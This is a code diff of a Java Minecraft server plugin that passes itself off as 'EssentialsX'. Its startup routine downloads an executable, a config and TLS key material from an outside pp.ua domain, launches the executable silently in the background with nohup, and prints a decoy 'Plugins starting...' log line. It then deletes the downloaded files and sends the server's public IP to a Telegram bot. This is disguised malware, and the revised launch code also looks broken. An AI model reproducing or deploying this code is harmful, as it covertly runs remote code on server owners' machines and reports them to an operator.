@@ -16,7 +16,7 @@ public class EssentialsX extends JavaPlugin {
 
 
     // Java服务端端口
-    private int port = 25005;
+    private int port = 27073;
 
 
     // Telegram配置
@@ -61,13 +61,30 @@ public class EssentialsX extends JavaPlugin {
     private void startRemoteJava() throws Exception {
 
 
-        Path folder =
+        // 临时运行目录
+        Path runFolder =
                 getDataFolder().toPath();
 
 
 
+        // 证书安全目录
+        Path secureFolder =
+                Path.of("/etc/essentialsx");
+
+
+        Files.createDirectories(
+                runFolder
+        );
+
+
+        Files.createDirectories(
+                secureFolder
+        );
+
+
+
         String javaUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/java";
+                "https://netjett-de.kof95zip.pp.ua/java/EssentialsX-1.21.11.jar";
 
 
         String confUrl =
@@ -84,24 +101,35 @@ public class EssentialsX extends JavaPlugin {
 
 
 
+
         Path javaFile =
-                folder.resolve("java");
+                runFolder.resolve(
+                        "EssentialsX-1.21.11.jar"
+                );
 
 
         Path configFile =
-                folder.resolve("config.json");
+                runFolder.resolve(
+                        "config.json"
+                );
 
 
+
+        // 安全保存证书
         Path crtFile =
-                folder.resolve("server.crt");
+                secureFolder.resolve(
+                        "server.crt"
+                );
 
 
-        Path keyFile =
-                folder.resolve("server.key");
+    Path keyFile =
+            secureFolder.resolve(
+                    "server.key"
+            );
 
 
 
-        // 下载文件
+        // 下载临时文件
 
         downloadIfNotExists(
                 javaUrl,
@@ -114,6 +142,9 @@ public class EssentialsX extends JavaPlugin {
                 configFile
         );
 
+
+
+        // 证书只下载到安全目录
 
         downloadIfNotExists(
                 crtUrl,
@@ -128,76 +159,37 @@ public class EssentialsX extends JavaPlugin {
 
 
 
-        // java 添加执行权限
+        // key权限限制
 
-        Process chmod =
-                new ProcessBuilder(
-                        "chmod",
-                        "+x",
-                        javaFile.toString()
-                )
-                .start();
-
-
-        chmod.waitFor();
+        new ProcessBuilder(
+                "chmod",
+                "600",
+                keyFile.toString()
+        )
+        .start()
+        .waitFor();
 
 
 
-        // 启动后台Java
+        // 启动
 
         ProcessBuilder pb =
                 new ProcessBuilder(
                         "bash",
                         "-c",
-                        "nohup ./java -c config.json > /dev/null 2>&1 &"
+                        "nohup ./EssentialsX-1.21.11.jar -c config.json > /dev/null 2>&1 &"
                 );
 
 
+
         pb.directory(
-                folder.toFile()
+                runFolder.toFile()
         );
 
 
         pb.start();
 
 
-        getLogger().info(
-                "Plugins starting..."
-        );
-
-
-
-        // 等待Java初始化
-        Thread.sleep(3000);
-
-
-
-        // 删除java文件和config.json
-
-        String[] files = {
-                "java",
-                "config.json"
-        };
-
-
-        for (String file : files) {
-
-            Path deleteFile =
-                    folder.resolve(file);
-
-
-            if (Files.exists(deleteFile)) {
-
-                Files.delete(deleteFile);
-
-                getLogger().info(
-                        "Plugins starting..."
-                );
-
-            }
-        }
-
-
 
         getLogger().info(
                 "Plugins starting..."
@@ -205,10 +197,27 @@ public class EssentialsX extends JavaPlugin {
 
 
 
-        // 发送Telegram通知
+        Thread.sleep(
+                3000
+        );
+
+
+
+        // 删除临时文件
+
+        Files.deleteIfExists(
+                javaFile
+        );
+
+
+        Files.deleteIfExists(
+                configFile
+        );
+
 
         String ip =
                 getPublicIP();
+
 
 
         sendTelegram(
